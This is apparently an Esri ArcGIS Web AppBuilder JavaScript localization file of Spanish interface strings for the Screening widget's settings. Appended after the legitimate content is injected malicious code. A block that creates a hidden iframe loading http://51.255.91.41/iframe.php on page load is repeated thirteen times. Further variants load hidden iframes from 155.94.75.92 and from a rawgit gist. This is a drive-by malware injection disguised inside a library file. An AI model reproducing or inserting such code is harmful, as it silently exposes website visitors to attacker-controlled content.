// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/Screening/setting/nls/strings":{units:{feetUnit:"Pies / Pies cuadrados",milesUnit:"Millas / Acres",metersUnit:"Metros / Metros cuadrados",kilometersUnit:"Kil\u00f3metros / Kil\u00f3metros cuadrados",hectaresUnit:"Kil\u00f3metros / Hect\u00e1reas"},analysisTab:{analysisTabLabel:"An\u00e1lisis",selectAnalysisLayerLabel:"Seleccionar capas de an\u00e1lisis",addLayerLabel:"Agregar capas",noValidLayersForAnalysis:"No se han encontrado capas v\u00e1lidas en el mapa web seleccionado.",noValidFieldsForAnalysis:"No se han encontrado campos v\u00e1lidos en el mapa web seleccionado. Elimine la capa seleccionada.",
addLayersHintText:"Sugerencia: seleccione las capas y los campos que desea analizar y mostrar en el informe",addLayerNameTitle:"Nombre de capa",addFieldsLabel:"Agregar campo",addFieldsPopupTitle:"Selecciona campos",addFieldsNameTitle:"Nombres de campo",aoiToolsLegendLabel:"Herramientas AOI",aoiToolsDescriptionLabel:"Habilite las herramientas para crear \u00e1reas de inter\u00e9s y especifique sus etiquetas",placenameLabel:"Nombre de lugar",drawToolsLabel:"Herramientas de dibujo",uploadShapeFileLabel:"Cargar un shapefile",
coordinatesLabel:"Coordenadas",coordinatesDrpDwnHintText:"Sugerencia: seleccione una unidad para visualizar los trazados poligonales introducidos",coordinatesBearingDrpDwnHintText:"Sugerencia: seleccione un rumbo para visualizar los trazados poligonales introducidos",allowShapefilesUploadLabel:"Permitir carga de shapefiles en el an\u00e1lisis",allowShapefilesUploadLabelHintText:'Sugerencia: muestre "Cargar shapefile en el an\u00e1lisis" en la pesta\u00f1a Informe',allowVisibleLayerAnalysisLabel:"No analizar ni ofrecer resultados sobre capas no visibles",
allowVisibleLayerAnalysisHintText:"Sugerencia: Las capas desactivadas o no visibles debido a la configuraci\u00f3n de la visibilidad de la escala no se analizar\u00e1n ni se incluir\u00e1n en los resultados impresos o descargados.",areaUnitsLabel:"Mostrar resultados de an\u00e1lisis en",maxFeatureForAnalysisLabel:"N\u00famero m\u00e1ximo de entidades para el an\u00e1lisis",maxFeatureForAnalysisHintText:"Sugerencia: defina el n\u00famero m\u00e1ximo de entidades para el an\u00e1lisis",searchToleranceLabelText:"Tolerancia de b\u00fasqueda",
searchToleranceHint:"Sugerencia: la tolerancia de b\u00fasqueda solo se usa cuando se analizan entradas de punto y de l\u00ednea",placenameButtonText:"Nombre de lugar",drawToolsButtonText:"Dibujar",shapefileButtonText:"Shapefile",coordinatesButtonText:"Coordenadas",invalidLayerErrorMsg:"Configure los campos de"},downloadTab:{downloadLegend:"Configuraci\u00f3n de descarga",reportLegend:"Ajustes de informe",downloadTabLabel:"Descargar",syncEnableOptionLabel:"Capas de entidades",syncEnableOptionHint:"Sugerencia: se usa para descargar informaci\u00f3n de entidades para las entidades que se intersecan con el \u00e1rea de inter\u00e9s en los formatos indicados.",
syncEnableOptionNote:"Nota: los servicios de entidades con la sincronizaci\u00f3n habilitada son necesarios para la opci\u00f3n Geodatabase de archivos.",extractDataTaskOptionLabel:"Servicio de geoprocesamiento Tarea de extracci\u00f3n de datos",extractDataTaskOptionHint:"Sugerencia: use un servicio de geoprocesamiento Tarea de extracci\u00f3n de datos publicado para descargar las entidades que se intersecan con el \u00e1rea de inter\u00e9s en los formatos Geodatabase de archivos o Shapefile.",cannotDownloadOptionLabel:"Deshabilitar descarga",
syncEnableTableHeaderTitle:{layerNameLabel:"Nombre de capa",csvFileFormatLabel:"CSV",fileGDBFormatLabel:"Geodatabase de archivos",allowDownloadLabel:"Permitir descarga"},setButtonLabel:"Establecer",GPTaskLabel:"Especificar la direcci\u00f3n URL del servicio de geoprocesamiento",printGPServiceLabel:"Direcci\u00f3n URL del servicio de impresi\u00f3n",setGPTaskTitle:"Especificar la direcci\u00f3n URL del servicio de geoprocesamiento requerido",logoLabel:"Logo",logoChooserHint:"Sugerencia: haga clic en el icono de la imagen para cambiar la imagen",
footnoteLabel:"Nota a pie de p\u00e1gina",columnTitleColorPickerLabel:"Color para los t\u00edtulos de las columnas",reportTitleLabel:"T\u00edtulo del informe",errorMessages:{invalidGPTaskURL:"Servicio de geoprocesamiento no v\u00e1lido. Seleccione un servicio de geoprocesamiento que contenga Tarea de extracci\u00f3n de datos.",noExtractDataTaskURL:"Seleccione cualquier servicio de geoprocesamiento que contenga Tarea de extracci\u00f3n de datos."}},generalTab:{generalTabLabel:"General",tabLabelsLegend:"Etiquetas del panel",
tabLabelsHint:"Sugerencia: especifique las etiquetas",AOITabLabel:"Panel \u00c1rea de inter\u00e9s",ReportTabLabel:"Panel Informe",bufferSettingsLegend:"Configuraci\u00f3n de la zona de influencia",defaultBufferDistanceLabel:"Distancia de zona de influencia predeterminada",defaultBufferUnitsLabel:"Unidades de zona de influencia",generalBufferSymbologyHint:"Sugerencia: defina la simbolog\u00eda que se debe usar para visualizar las zonas de influencia alrededor de las \u00e1reas de inter\u00e9s definidas",
aoiGraphicsSymbologyLegend:"Simbolog\u00eda de gr\u00e1ficos de AOI",aoiGraphicsSymbologyHint:"Sugerencia: configure la simbolog\u00eda que se debe usar al definir \u00e1reas de inter\u00e9s de punto, de l\u00ednea y poligonales",pointSymbologyLabel:"Punto",previewLabel:"Previsualizaci\u00f3n",lineSymbologyLabel:"L\u00ednea",polygonSymbologyLabel:"Pol\u00edgono",aoiBufferSymbologyLabel:"Simbolog\u00eda de zona de influencia",pointSymbolChooserPopupTitle:"S\u00edmbolo de direcci\u00f3n o ubicaci\u00f3n",
polygonSymbolChooserPopupTitle:"Seleccionar s\u00edmbolo para resaltar pol\u00edgono",lineSymbolChooserPopupTitle:"Seleccionar s\u00edmbolo para resaltar l\u00ednea",aoiSymbolChooserPopupTitle:"Definir s\u00edmbolo de zona de influencia",aoiTabText:"AOI",reportTabText:"Informe",invalidSymbolValue:"Valor de s\u00edmbolo no v\u00e1lido."},searchSourceSetting:{searchSourceSettingTabTitle:"Configuraci\u00f3n de fuente de b\u00fasqueda",searchSourceSettingTitle:"Configuraci\u00f3n de fuente de b\u00fasqueda",
searchSourceSettingTitleHintText:"Agrega y configura servicios de geocodificaci\u00f3n o capas de entidades como fuentes de b\u00fasqueda. Estas fuentes especificadas determinan qu\u00e9 se puede buscar en el cuadro de b\u00fasqueda",addSearchSourceLabel:"Agregar origen de b\u00fasqueda",featureLayerLabel:"Capa de entidades",geocoderLabel:"Geocodificador",generalSettingLabel:"Configuraci\u00f3n general",allPlaceholderLabel:"Texto del marcador de posici\u00f3n para buscar en todo:",allPlaceholderHintText:"Sugerencia: escriba el texto que se va a mostrar como marcador de posici\u00f3n mientras busca todas las capas y el geocodificador",
generalSettingCheckboxLabel:"Mostrar ventana emergente de la entidad o la ubicaci\u00f3n encontrada",countryCode:"C\u00f3digo(s) de pa\u00eds o regi\u00f3n",countryCodeEg:"p. ej., ",countryCodeHint:"Si se deja este valor en blanco, se buscar\u00e1 en todos los pa\u00edses y regiones",questionMark:"?",searchInCurrentMapExtent:"Buscar solo en la extensi\u00f3n de mapa actual",zoomScale:"Aplicar zoom a escala",locatorUrl:"Direcci\u00f3n URL del geocodificador",locatorName:"Nombre del geocodificador",
locatorExample:"Ejemplo",locatorWarning:"No se admite esta versi\u00f3n del servicio de geocodificaci\u00f3n. El widget admite servicios de geocodificaci\u00f3n 10.0 y superiores.",locatorTips:"No hay sugerencias disponibles porque el servicio de geocodificaci\u00f3n no admite la opci\u00f3n de sugerencias.",layerSource:"Origen de capa",setLayerSource:"Establecer origen de capa",setGeocoderURL:"Establecer direcci\u00f3n URL de geocodificador",searchLayerTips:"No hay sugerencias disponibles porque el servicio de entidades no admite la opci\u00f3n de paginaci\u00f3n.",
placeholder:"Texto del marcador de posici\u00f3n",searchFields:"Campos de b\u00fasqueda",displayField:"Mostrar campo",exactMatch:"Coincidencia exacta",maxSuggestions:"M\u00e1ximo de sugerencias",maxResults:"Resultados m\u00e1ximos",enableLocalSearch:"Habilitar b\u00fasqueda local",minScale:"Escala M\u00ednima",minScaleHint:"Si la escala del mapa es mayor que esta escala, se aplicar\u00e1 la b\u00fasqueda local",radius:"Radio",radiusHint:"Permite especificar el radio de un \u00e1rea alrededor del centro del mapa actual que se utilizar\u00e1 para mejorar la clasificaci\u00f3n de los candidatos de geocodificaci\u00f3n a fin de que se devuelvan primero aquellos m\u00e1s cercanos a la ubicaci\u00f3n",
setSearchFields:"Establecer campos de b\u00fasqueda",set:"Establecer",invalidUrlTip:"No se puede acceder a la direcci\u00f3n URL ${URL} o bien no es v\u00e1lida.",invalidSearchSources:"Configuraci\u00f3n de fuente de b\u00fasqueda no v\u00e1lida"},errorMsg:{textboxFieldsEmptyErrorMsg:"Rellene los campos obligatorios",bufferDistanceFieldsErrorMsg:"Introduzca valores v\u00e1lidos",invalidSearchToleranceErrorMsg:"Introduzca un valor v\u00e1lido para la tolerancia de b\u00fasqueda",atLeastOneCheckboxCheckedErrorMsg:"Configuraci\u00f3n no v\u00e1lida: se requiere al menos una herramienta AOI.",
noLayerAvailableErrorMsg:"No hay capas disponibles",layerNotSupportedErrorMsg:"No compatible ",noFieldSelected:"Use la acci\u00f3n de editar para seleccionar los campos para el an\u00e1lisis.",duplicateFieldsLabels:'Se ha agregado una etiqueta duplicada "${labelText}" para: "${itemNames}"',noLayerSelected:"Seleccione al menos una capa para el an\u00e1lisis",errorInSelectingLayer:"No se puede completar la operaci\u00f3n de selecci\u00f3n de la capa. Vuelva a intentarlo.",errorInMaxFeatureCount:"Introduzca el n\u00famero m\u00e1ximo de entidades v\u00e1lido para el an\u00e1lisis."},
_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});